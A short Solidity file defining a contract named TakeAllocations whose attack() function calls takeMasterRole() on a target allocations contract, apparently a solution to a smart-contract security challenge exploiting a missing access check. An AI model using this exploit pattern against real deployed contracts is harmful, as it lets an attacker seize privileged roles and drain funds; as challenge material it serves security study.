// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

interface IAllocations {
    function takeMasterRole() external;

    function collectAllocations() external;
} 

contract TakeAllocations {
    IAllocations public immutable attackAllocations;

    constructor(address _allocations) payable{
        attackAllocations = IAllocations(_allocations);
    }

    function attack() public payable{
        attackAllocations.takeMasterRole();
    }
}